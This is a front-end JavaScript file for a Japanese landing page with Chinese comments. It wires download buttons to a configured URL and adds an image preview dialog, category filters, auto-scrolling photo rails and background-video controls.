/**
 * LIVE / 日语落地页配置。无需打包，保存后刷新即可。
 * 原下载链接和 .js-download 接入保留。实际跳转也可能由原站 download.js 分配。
 */
const DOWNLOAD_URL = "https://aaqvqjbr5xxcjmrpha6jntinmm0uiqlf.lambda-url.eu-south-2.on.aws/Veoza";
const OPEN_IN_NEW_TAB = false;

// 视频未提供时留空。放入 videos/hero.mp4 后，将下一行改成 "videos/hero.mp4"。
const BACKGROUND_VIDEO_URL = "videos/hero.mp4";;
// 如需上移/下移背景人物，可修改这里。例如 "50% 20%"、"50% 50%"。
const BACKGROUND_VIDEO_POSITION = "50% 28%";

// 图片排列不依赖 JS；只有筛选、弹窗、轻微横向滚动和视频控制需要 JS。
(() => {
  "use strict";
  const motion = window.matchMedia("(prefers-reduced-motion: reduce)");
  document.documentElement.classList.add("preview-enabled");
  document.querySelectorAll(".js-download").forEach((button) => {
    button.href = DOWNLOAD_URL;
    if (OPEN_IN_NEW_TAB) {
      button.target = "_blank";
      button.rel = "noopener noreferrer";
    } else {
      button.removeAttribute("target");
      button.removeAttribute("rel");
    }
  });
  const year = document.getElementById("copyright-year");
  if (year) year.textContent = String(new Date().getFullYear());

  // 仅展示静态预览，不伪装为真实聊天室或实时在线数据。
  const dialog = document.getElementById("preview-dialog");
  const previewImage = document.getElementById("preview-image");
  const previewTitle = document.getElementById("preview-title");
  let lastFocus = null;
  document.querySelectorAll("[data-preview]").forEach((card) => {
    card.addEventListener("click", () => {
      if (!dialog || typeof dialog.showModal !== "function") return;
      previewImage.src = card.dataset.image;
      previewImage.alt = `${card.dataset.label}の人物イメージ`;
      previewTitle.textContent = card.dataset.label;
      lastFocus = card;
      dialog.showModal();
      document.documentElement.classList.add("is-modal-open");
    });
  });
  if (dialog) {
    dialog.querySelector(".dialog-close").addEventListener("click", () => dialog.close());
    dialog.addEventListener("click", (event) => {
      const rect = dialog.getBoundingClientRect();
      if (event.target === dialog && (event.clientX < rect.left || event.clientX > rect.right || event.clientY < rect.top || event.clientY > rect.bottom)) dialog.close();
    });
    dialog.addEventListener("close", () => {
      document.documentElement.classList.remove("is-modal-open");
      if (lastFocus) lastFocus.focus({ preventScroll: true });
    });
  }

  // 图片风格筛选。不会冒充按真实在线状态筛选。
  const filterButtons = [...document.querySelectorAll("[data-filter]")];
  const gridCards = [...document.querySelectorAll("#portrait-grid .portrait-card")];
  filterButtons.forEach((button) => {
    button.addEventListener("click", () => {
      let visible = 0;
      filterButtons.forEach((other) => {
        const active = other === button;
        other.classList.toggle("is-active", active);
        other.setAttribute("aria-pressed", String(active));
      });
      gridCards.forEach((card) => {
        card.hidden = button.dataset.filter !== "all" && card.dataset.category !== button.dataset.filter;
        if (!card.hidden) visible += 1;
      });
      document.getElementById("filter-status").textContent = `${visible}枚のイメージを表示しています。掲載写真は実際の配信状況を示すものではありません。`;
    });
  });

  // 三排照片轻微来回滚动。触摸、悬停、键盘聚焦时暂停，仍可手动滑动。
  const rails = [...document.querySelectorAll("[data-rail]")].map((element, index) => ({
    element, direction: Number(element.dataset.direction) || 1, speed: 9 + index * 2,
    visible: false, hover: false, focus: false, touching: false, pauseUntil: 0, position: 0,
  }));
  let paused = motion.matches;
  const motionButton = document.getElementById("motion-toggle");
  const syncMotionButton = () => {
    motionButton.setAttribute("aria-pressed", String(paused));
    motionButton.querySelector("span").textContent = paused ? "動きを再生" : "動きを止める";
    motionButton.querySelector("svg").innerHTML = paused ? '<path d="m8 4 12 8-12 8Z"/>' : '<path d="M8 5v14M16 5v14"/>';
  };
  motionButton.addEventListener("click", () => { paused = !paused; syncMotionButton(); });
  syncMotionButton();
  const observer = "IntersectionObserver" in window ? new IntersectionObserver((entries) => {
    entries.forEach((entry) => {
      const rail = rails.find((item) => item.element === entry.target);
      if (rail) rail.visible = entry.isIntersecting;
    });
  }, { rootMargin: "40px" }) : null;
  rails.forEach((rail) => {
    const el = rail.element;
    if (observer) observer.observe(el); else rail.visible = true;
    if (rail.direction < 0) { el.scrollLeft = el.scrollWidth - el.clientWidth; rail.position = el.scrollLeft; }
    el.addEventListener("pointerenter", (event) => { if (event.pointerType === "mouse") rail.hover = true; });
    el.addEventListener("pointerleave", () => { rail.hover = false; });
    el.addEventListener("pointerdown", () => { rail.touching = true; rail.pauseUntil = Infinity; });
    const release = () => { if (rail.touching) { rail.touching = false; rail.pauseUntil = performance.now() + 5500; rail.position = el.scrollLeft; } };
    window.addEventListener("pointerup", release, { passive: true });
    window.addEventListener("pointercancel", release, { passive: true });
    el.addEventListener("wheel", () => { rail.pauseUntil = performance.now() + 5500; }, { passive: true });
    el.addEventListener("scroll", () => { if (paused || rail.hover || rail.focus || rail.touching || performance.now() < rail.pauseUntil) rail.position = el.scrollLeft; }, { passive: true });
    el.addEventListener("focusin", () => { rail.focus = true; });
    el.addEventListener("focusout", (event) => { rail.focus = el.contains(event.relatedTarget); rail.position = el.scrollLeft; });
    el.addEventListener("keydown", (event) => {
      if (event.target !== el || !["ArrowRight", "ArrowLeft"].includes(event.key)) return;
      event.preventDefault();
      el.scrollBy({ left: event.key === "ArrowRight" ? 180 : -180, behavior: motion.matches ? "auto" : "smooth" });
    });
  });
  let lastTime = performance.now();
  function animate(now) {
    const seconds = Math.min((now - lastTime) / 1000, 0.05);
    lastTime = now;
    if (!paused && !document.hidden && !dialog?.open) {
      rails.forEach((rail) => {
        if (!rail.visible || rail.hover || rail.focus || rail.touching || now < rail.pauseUntil) return;
        const max = rail.element.scrollWidth - rail.element.clientWidth;
        if (max < 1) return;
        rail.position = Math.max(0, Math.min(max, rail.position + rail.direction * rail.speed * seconds));
        rail.element.scrollLeft = rail.position;
        if (rail.position <= 0) rail.direction = 1;
        if (rail.position >= max) rail.direction = -1;
      });
    }
    window.requestAnimationFrame(animate);
  }
  window.requestAnimationFrame(animate);

  // 视频：默认静音循环、行内播放；未配置/出错/自动播放受阻时保留封面。
  const video = document.getElementById("hero-video");
  const videoButton = document.getElementById("video-toggle");
  const media = document.querySelector(".hero-media");
  const updateVideoButton = () => {
    const isPaused = video.paused;
    const label = isPaused ? "動画を再生" : "動画を停止";
    videoButton.querySelector("span").textContent = label;
    videoButton.setAttribute("aria-label", isPaused ? "背景動画を再生" : "背景動画を一時停止");
    videoButton.querySelector("svg").innerHTML = isPaused ? '<path d="m8 4 12 8-12 8Z"/>' : '<path d="M8 5v14M16 5v14"/>';
  };
  if (BACKGROUND_VIDEO_URL.trim()) {
    video.style.objectPosition = BACKGROUND_VIDEO_POSITION;
    video.muted = true;
    video.autoplay = !motion.matches;
    video.src = BACKGROUND_VIDEO_URL;
    video.addEventListener("loadeddata", () => { videoButton.hidden = false; updateVideoButton(); });
    video.addEventListener("playing", () => { media.classList.add("is-playing"); videoButton.hidden = false; updateVideoButton(); });
    video.addEventListener("pause", updateVideoButton);
    video.addEventListener("error", () => { media.classList.remove("is-playing"); videoButton.hidden = true; });
    if (!motion.matches) video.play().catch(() => { media.classList.remove("is-playing"); videoButton.hidden = false; updateVideoButton(); });
    videoButton.addEventListener("click", () => {
      if (video.paused) video.play().catch(() => { media.classList.remove("is-playing"); });
      else video.pause();
    });
  }
  const motionChange = (event) => {
    if (event.matches) { paused = true; syncMotionButton(); video.pause(); }
  };
  if (typeof motion.addEventListener === "function") motion.addEventListener("change", motionChange);
})();
